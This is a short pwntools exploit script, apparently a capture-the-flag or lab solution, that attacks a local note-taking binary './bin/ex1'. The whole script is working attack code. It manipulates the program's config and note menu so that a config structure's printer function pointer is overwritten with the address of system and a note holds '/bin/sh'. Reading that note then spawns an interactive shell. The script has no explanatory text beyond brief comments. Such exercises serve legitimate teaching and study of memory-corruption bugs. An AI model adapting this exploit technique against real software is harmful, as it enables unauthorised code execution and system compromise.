from pwn import *

target = process("./bin/ex1")

# Config
target.sendline(b"4")
target.sendline(b"config_file")

# Reset config
target.sendline(b"5")

# Create NOTES[0]
target.sendline(b"1")
target.sendline(b"0")
system_addr_notes_save = 0x401070
payload1 = p64(system_addr_notes_save) + p64(0x0)
target.sendline(payload1)
payload2 = p64(0x0) * 6
target.sendline(payload2)

# Create NOTES[1]
target.sendline(b"1")
target.sendline(b"1")
payload3 = b"/bin/sh\0" + p64(0x0)
target.sendline(payload3)
payload2 = p64(0x0) * 6
target.sendline(payload2)

# Read NOTES[1]
# CONFIG->printer(NOTES[index]); (printer = system; NOTES[1] = "/bin/sh\0...")
target.sendline(b"2")
target.sendline(b"1")

target.interactive()